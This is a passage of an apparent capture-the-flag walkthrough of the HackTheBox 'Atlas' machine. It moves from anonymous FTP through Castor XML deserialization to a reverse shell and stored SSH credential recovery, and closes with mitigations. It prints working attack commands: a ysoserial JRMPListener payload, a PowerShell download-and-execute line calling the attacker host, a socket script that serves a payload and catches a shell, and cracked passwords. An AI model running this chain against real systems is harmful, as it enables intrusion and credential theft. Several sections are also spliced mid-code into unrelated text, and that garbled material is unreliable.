Because clever administrators sometimes hide services on high ports, thinking security through obscurity helps. It does not, but it means we must look everywhere.</p><p>Results:</p><p>PORT STATE SERVICE VERSION<br>21/tcp open ftp FileZilla ftpd 1.7.2<br>&nbsp;ftp-anon: Anonymous FTP login allowed (FTP code 230)<br>&nbsp;ftp-syst: SYST: UNIX emulated by FileZilla<br>22/tcp open ssh OpenSSH for_Windows_9.5 (protocol 2.0)<br>3389/tcp open ms-wbt-server Microsoft Terminal Services<br>8080/tcp open http Apache Tomcat<br>&nbsp;http-title: Atlas Pilot</p><p>What do we see here?</p><p>- Port 21 is FTP with FileZilla. The nmap script immediately tells us anonymous login is allowed. This is a strong indicator.<br>- Port 22 is OpenSSH for Windows. Less common than RDP on Windows, but very useful for stable access later.<br>- Port 3389 is RDP. Good to know, but usually requires valid credentials.<br>- Port 8080 is Apache Tomcat running a custom app called Atlas Pilot.</p><p>The key insight: Port 21 is our starting point. Anonymous FTP means we can probably download files. Those files might contain the application itself, source code, configuration files, or even credentials. Port 8080 is our main target, but we do not yet know how to attack it. That is why we go to FTP first - to gather intelligence.</p><figure><img src="/writing/media/e4607411badfba058f9578c1.webp" alt="HackTheBox “Atlas” Walkthrough, figure 2" width="1200" height="1164" loading="lazy" decoding="async"></figure><h2 id="phase-2-anonymous-ftp-a-recurring-source-of-useful-data">Phase 2: Anonymous FTP: a recurring source of useful data</h2><p>FTP is one of the oldest protocols on the internet. Anonymous FTP means the server allows logins with the username anonymous and any password, usually an email address or blank.</p><p>Why does anonymous FTP exist? Historically it was used for public file servers like software mirrors. But in a production environment, it is almost always a mistake.</p><p>Command:<br>ftp 10.129.238.8</p><p>When prompted:<br>Name: anonymous<br>Password: ← just press Enter</p><p>What is happening under the hood:<br>- Your machine opens a TCP connection to port 21<br>- The server sends a banner: 220-FileZilla Server 1.7.2<br>- You send USER anonymous<br>- The server responds 331 Please, specify the password.<br>- You send PASS empty<br>- The server responds 230 Login successful.</p><p>You are now authenticated as the anonymous user on the FTP server.</p><p>Inside the FTP shell:<br>dir</p><p>This shows:<br>-r - r - r - 1 ftp ftp 22851463 atlas-pilot-1.0.0-SNAPSHOT.jar<br>-r - r - r - 1 ftp ftp 586379 atlas_generator.zip</p><p>Why is this a useful source?</p><p>1. atlas-pilot-1.0.0-SNAPSHOT.jar is the compiled Java application running on port 8080.<br>2. atlas_generator.zip appears to be the source code of the project.</p><p>Having both the binary and the source code is incredibly rare and valuable. With source code, we do not need to guess how the application works. We can read it like a book.</p><p>Downloading the files:<br>binary ← Switch to binary mode (prevents corruption)<br>get atlas-pilot-1.0.0-SNAPSHOT.jar<br>get atlas_generator.zip<br>bye ← Exit FTP</p><p>The binary command is crucial. FTP has two modes: ASCII and Binary. ASCII mode tries to translate line endings between operating systems. For compiled JARs and ZIPs, this would corrupt the files. use binary for non-text files.</p><figure><img src="/writing/media/46abf862da887b18c1f24532.webp" alt="HackTheBox “Atlas” Walkthrough, figure 3" width="1200" height="1150" loading="lazy" decoding="async"></figure><h2 id="phase-3-source-code-analysis-reading-the-blueprints">Phase 3: Source Code Analysis: Reading the Blueprints</h2><p>We now have atlas_generator.zip on the local machine and can inspect it.</p><p>Command:<br>unzip atlas_generator.zip -d atlas_source</p><p>This creates a directory atlas_source containing a Maven project. Maven is a build tool for Java. The project structure looks like this:</p><p>Atlas_source/<br>&nbsp;pom.xml ← Project dependencies (THE MOST IMPORTANT FILE)<br>&nbsp;src/<br>&nbsp;main/<br>&nbsp;java/<br>&nbsp;com/example/uploadingfiles/<br>&nbsp;Client.java<br>&nbsp;Employee.java<br>&nbsp;FileUploadController.java<br>&nbsp;UploadingFilesApplication.java</p><p>Reading pom.xml - The Dependency useful sources</p><p>Pom.xml is Maven's project object model file. It declares every third-party library the application uses. This is where attackers hunt for known-vulnerable dependencies.</p><p>Command:<br>cat atlas_source/pom.xml</p><p>What we are looking for:<br>- Old versions of libraries with known CVEs<br>- Libraries commonly used in deserialization gadget chains<br>- XML parsing libraries</p><p>Key dependencies we find:</p><p>- castor-xml 1.4.1: An XML serialization library known to allow arbitrary class instantiation when used without a mapping file.<br>- commons-beanutils 1.9.2: A classic library used in Java deserialization gadget chains (ysoserial's CommonsBeanutils1).<br>- commons-collections 3.2.1: Another classic gadget chain library.<br>- spring-boot-starter-web: Spring Framework is in the classpath. Spring contains classes like PropertyPathFactoryBean that can trigger JNDI lookups.</p><p>Pattern Recognition:</p><p>When you see these three libraries together in an application that parses XML, treat it as a high-risk condition:<br>- castor-xml for arbitrary class instantiation via XML<br>- commons-beanutils for deserialization gadget chains<br>- spring for JNDI lookup gadgets</p><p>This is the recipe for Remote Code Execution through XML deserialization.</p><p>Finding the Upload Handler</p><p>Next, search for upload-related code to identify where user input enters the application.</p><p>Command:<br>find atlas_source/ -name "*.java" | xargs grep -l "upload\|Unmarshal"</p><p>This finds two files:<br>- FileUploadController.java handles HTTP requests<br>- Client.java handles XML parsing</p><p>Reading FileUploadController.java:</p><p>The controller has three mappings:<br>- GET / returns the upload form<br>- GET /generateTemplate returns a sample XML template generated by Client.createXML()<br>- POST / receives a MultipartFile and passes it to Client.parseXML()</p><p>The critical line is:<br>Employee person = Client.parseXML(file.getInputStream());</p><p>The uploaded file goes directly into the XML parser with zero validation. This is our attack vector.</p><p>Reading Client.java - The Parser</p><p>Public class Client {<br>&nbsp;public static Employee parseXML(InputStream inputStream) {<br>&nbsp;Employee employee = null;<br>&nbsp;try {<br>&nbsp;XMLContext xmlContext = new XMLContext();<br>&nbsp;Unmarshaller unmarshaller = new Unmarshaller(Employee.class);<br>&nbsp;// NO MAPPING FILE SET!<br>&nbsp;employee = (Employee) unmarshaller.unmarshal(xmlReader);<br>&nbsp;} catch (Exception e) {<br>&nbsp;e.printStackTrace();<br>&nbsp;}<br>&nbsp;return employee;<br>&nbsp;}<br>}</p><p>The Developer Mistake:</p><p>Castor XML's Unmarshaller can take a mapping file that restricts which Java classes are allowed to be instantiated from XML. Without this mapping file, Castor reads the xsi:type attribute in the XML and instantiates any class it can find in the classpath via Java reflection.</p><p>This is the equivalent of letting a user say "I want this input treated as a System.Runtime object" and the server blindly obeying.</p><p>The developer probably thought: "I am parsing Employee XML, so of course it will only contain Employee data." But XML with xsi:type is polymorphic - it can declare itself to be any subtype.</p><figure><img src="/writing/media/9c6b8d2b94c8b897066817a2.webp" alt="HackTheBox “Atlas” Walkthrough, figure 4" width="1200" height="192" loading="lazy" decoding="async"></figure><h2 id="phase-4-understanding-the-vulnerability">Phase 4: Understanding the Vulnerability</h2><p>What is xsi:type?</p><p>In XML Schema, xsi:type (XML Schema Instance type) allows an element to declare its actual data type. In a secure system, a mapping file whitelists allowed types.</p><p>Without the mapping file, the attack works like this:</p><p>&lt;name xsi:type="java:org.springframework.beans.factory.config.PropertyPathFactoryBean"&gt;<br>&nbsp;…<br>&lt;/name&gt;</p><p>Castor sees xsi:type="java:org.springframework.beans.factory.config.PropertyPathFactoryBean" and says: "Okay, I will instantiate that class and populate its fields from the XML."</p><p>Spring Beans as Gadgets</p><p>Spring Framework contains two beans perfect for this attack:</p><p>1. PropertyPathFactoryBean - A Spring bean factory that can evaluate properties of other beans. It can be configured to point to a remote JNDI name.<br>2. SimpleJndiBeanFactory - Performs a JNDI lookup to a provided URL.</p><p>When Castor instantiates these beans during XML parsing, Spring automatically triggers the JNDI lookup.</p><p>JNDI to JRMP to Deserialization</p><p>JNDI (Java Naming and Directory Interface) is a Java API for naming and directory services. In older Java versions, JNDI lookups to remote RMI or LDAP servers could return serialized Java objects that the local JVM would automatically deserialize.</p><p>The chain:<br>1. We upload malicious XML to /<br>2. Castor instantiates PropertyPathFactoryBean and SimpleJndiBeanFactory<br>3. Spring performs a JNDI or RMI lookup to our attacker machine<br>4. Our attacker machine, running ysoserial JRMPListener, sends back a malicious serialized object<br>5. The target JVM deserializes this object<br>6. The deserialization triggers a gadget chain (CommonsBeanutils1) that executes arbitrary system commands</p><p>Why Java 11?</p><p>Ysoserial's CommonsBeanutils1 gadget chain relies on com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl, an internal JDK class. Since Java 17, the Java Platform Module System (JPMS) strictly restricts access to internal classes. This gadget chain does not work on Java 17 or newer.</p><p>Our Kali had Java 25 installed, so we had to install Java 11.</p><p>Firewall Considerations</p><p>The target's outbound firewall only allows port 8000. This means:<br>- Our reverse shell must connect to port 8000<br>- If we serve a file via HTTP, we must also use port 8000<br>- But we cannot run HTTP and a netcat listener on the same port simultaneously</p><p>This is a network constraint that requires adaptation. We built a Python combo script that serves the file, closes the socket, and then starts ncat on the same port.</p><h2 id="phase-5-exploitation-preparation">Phase 5: Exploitation Preparation</h2><p>Installing Java 11</p><p>Why: ysoserial requires Java 11 for the CommonsBeanutils1 gadget chain.</p><p>Check current Java:<br>java -version</p><p>If it shows Java 17, 21, or 25, install Java 11:<br>sudo apt-get update<br>sudo apt-get install openjdk-11-jre-headless</p><p>Verify:<br>ls /usr/lib/jvm/java-11-openjdk-*/bin/java</p><p>Getting ysoserial</p><p>Ysoserial is a tool for generating payloads that exploit unsafe Java object deserialization.</p><p>Download:<br>wget <a href="https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar" rel="nofollow noopener noreferrer" target="_blank">https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar<span class="sr-only"> opens in a new tab</span></a></p><figure><img src="/writing/media/9a62a803e8da63c55cc40719.webp" alt="HackTheBox “Atlas” Walkthrough, figure 5" width="1200" height="663" loading="lazy" decoding="async"></figure><p>Crafting payload.xml</p><p>The malicious XML must match the structure expected by the application (Employee) but inject our Spring beans.</p><pre class="article-code-soft-wrap"><code data-language="text">┌──(kali㉿kali)-[~/Downloads/htb]

Captures output, prepends a PowerShell prompt, and sends it back</p><p>The Combo Server - Solving the Port Conflict</p><p>Since only port 8000 is allowed outbound, we need to serve the PowerShell script via HTTP on port 8000 and catch the reverse shell on port 8000.</p><p>We cannot do both simultaneously. Our solution is a Python script that transitions automatically:</p><pre class="article-code-soft-wrap"><code data-language="text">#!/usr/bin/env python3import socket, time, subprocess# Phase 1: HTTP servers = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)s.bind(('0.0.0.0', 8000))s.listen(1)print("[*] Serving invoke-shell.ps1 on port 8000…")conn, addr = s.accept()data = conn.recv(4096)with open('invoke-shell.ps1', 'rb') as f: content = f.read()response = b"HTTP/1.1 200 OK\r\nContent-Length: " + str(len(content)).encode() + b"\r\n\r\n" + contentconn.sendall(response)conn.close()s.close()print("[*] Script served. We explore John's home directory:</p><p>Dir C:\Users\John\Downloads\</p><p>We find WinSSHTerm - a Windows SSH client that stores connection profiles, sometimes including encrypted passwords.</p><p>Understanding WinSSHTerm's Config</p><p>Inside C:\Users\John\Downloads\WinSSHTerm\config\:<br>- connections.xml contains saved SSH connections including usernames and encrypted passwords<br>- key contains encryption key material</p><p>A typical connections.xml entry looks like:</p><p>&lt;WinSSHTerm Version="1" VerifyKey="[base64]"&gt;<br>&nbsp;&lt;Node Name="Admin SSH" Type="Connection"<br>&nbsp;Username="administrator"<br>&nbsp;Password="[base64_encrypted_password]"<br>&nbsp;Hostname="127.0.0.1" Port="22" /&gt;<br>&lt;/WinSSHTerm&gt;</p><figure><img src="/writing/media/5d0c97d40f20eab25e2bb366.webp" alt="HackTheBox “Atlas” Walkthrough, figure 13" width="1200" height="444" loading="lazy" decoding="async"></figure><p>Context:</p><p>Users love convenience. SSH clients that remember passwords are convenient. But the encryption is only as strong as the master password chosen to protect it. If the master password is weak, the entire encryption scheme collapses.</p><p>The Crypto (For Understanding)</p><p>WinSSHTerm uses a three-layer encryption scheme:</p><p>Layer 1: The key file (113 bytes) is AES-256-CBC encrypted. The AES key and IV are derived via PBKDF2-HMAC-SHA1 (1012 iterations) with:<br>- Password = obfuscated_prefix + MasterPassword + fixed_suffix<br>- Salt = hardcoded hex value in the binary</p><p>The prefix is obfuscated by XOR in a static constructor:<br>for (int i = 0; i &lt; data.Length; i++) {<br>&nbsp;data[i] = (byte)((data[i] ^ i) ^ 0xAA);<br>}</p><p>Layer 2: The decrypted key file yields 64 bytes of base64-decoded key material. Even-indexed bytes become PasswordKey. Odd-indexed bytes become SaltKey after binary NOT.</p><p>Layer 3: The encrypted password from connections.xml is decrypted with AES-256-CBC using another PBKDF2 derivation with PasswordKey as the password and SaltKey as the salt.</p><p>The shortcut: Previous research already performed this entire reverse-engineering process and brute-forced the master password against rockyou.txt. If you have source code, read it. If you do not, enumerate the web app by visiting it and inspecting forms.</p><p>Problem 2: Java Version Too New</p><p>What happened: Kali had Java 25 installed. ysoserial's CommonsBeanutils1 requires Java 11.</p><p>Why: Java 17 and newer introduced JPMS module restrictions that block access to internal classes needed by the gadget chain.</p><p>Fix: Installed openjdk-11-jre-headless and explicitly used /usr/lib/jvm/java-11-openjdk-arm64/bin/java.</p><p>Problem 3: Firewall-Restricted Outbound Ports</p><p>What happened: The target only allows outbound connections on port 8000.</p><p>Why: Windows Firewall or network-level rules restrict outbound traffic to reduce the attack surface.</p><p>Fix: Built a combo Python script that serves the PowerShell file via HTTP on port 8000, then releases the socket and starts ncat on the same port to catch the reverse shell.</p><h2 id="key-lessons-and-mitigations">Key Lessons and Mitigations</h2><p>1. Disable Anonymous FTP<br>Problem: Anonymous FTP exposed the JAR and source code.<br>Fix: Disable anonymous login. Do not deploy source code or binaries on publicly accessible file services.</p><p>2. Secure XML Parsers<br>Problem: Castor XML Unmarshaller was used without a mapping file.<br>Fix: Always provide a mapping file that restricts allowed types:</p><p>Mapping mapping = new Mapping();<br>mapping.loadMapping(new InputSource(getClass().getResourceAsStream("/castor-mapping.xml")));<br>Unmarshaller unmarshaller = new Unmarshaller(Employee.class);<br>unmarshaller.setMapping(mapping);</p><p>3. Update Vulnerable Dependencies<br>Problem: commons-beanutils 1.9.2 and commons-collections 3.2.1 are known gadget chain libraries.<br>Fix: Update to patched versions:<br>- commons-beanutils -&gt; 1.9.4 or newer<br>- commons-collections -&gt; 3.2.2 or newer, or migrate to 4.x</p><p>4. Strong Master Passwords<br>Problem: WinSSHTerm's master password hottie101 was in rockyou.txt.<br>Fix: Use long, random master passwords. Prefer SSH key authentication over password storage in client applications.</p><p>5. Restrict Outbound Traffic<br>Problem: Even with outbound restrictions, port 8000 was exploitable.<br>Fix: Apply strict outbound whitelisting. Monitor for unusual outbound connections.</p><h2 id="complete-command-reference">Complete Command Reference</h2><h2 id="enumeration-nmap-sc-sv-p-10-129-238-8-on-nmap-atlas-full-txt">Enumeration:nmap -sC -sV -p- 10.129.238.8 -oN nmap/atlas-full.txt</h2><p>FTP:<br>ftp 10.129.238.8<br># anonymous / blank<br>binary<br>get atlas-pilot-1.0.0-SNAPSHOT.jar<br>get atlas_generator.zip<br>bye</p><p>Source analysis:<strong><br></strong>unzip atlas_generator.zip -d atlas_source<br>cat atlas_source/pom.xml</p><p>Install Java 11:<br>sudo apt-get install openjdk-11-jre-headless</p><p>Download ysoserial:<br>wget <a href="https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar" rel="nofollow noopener noreferrer" target="_blank">https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar<span class="sr-only"> opens in a new tab</span></a></p><p>JRMP Listener (Terminal 2):<br>/usr/lib/jvm/java-11-openjdk-arm64/bin/java -cp ysoserial-all.jar \<br>&nbsp;ysoserial.exploit.JRMPListener 1099 CommonsBeanutils1 \<br>&nbsp;"powershell.exe -c \"Start-Sleep -s 2; IEX(New-Object Net.WebClient).downloadString('<span class="article-lab-address">http://10.10.14.6:8000/invoke-shell.ps1')\<span> (lab-only address)</span></span>""</p><p>Combo server (Terminal 1):<br>python3 serve_and_catch.py</p><p>Trigger exploit (Terminal 3):<br>curl -X POST <span class="article-lab-address">http://10.129.238.8:8080/<span> (lab-only address)</span></span> -F 'file=@payload.xml'</p><p>User flag:<br>type C:\Users\John\Desktop\user.txt</p><p>SSH as administrator:<br>ssh administrator@10.129.238.8<br># Password: lzm2wx3Fn7q7gBLDRuf4</p><p>Root flag:<br>type C:\Users\Administrator\Desktop\root.txt</p><h2 id="source-assisted-review">Source-assisted review</h2><p>Anonymous FTP exposes the application source and changes the assessment from blind testing to source-assisted review.
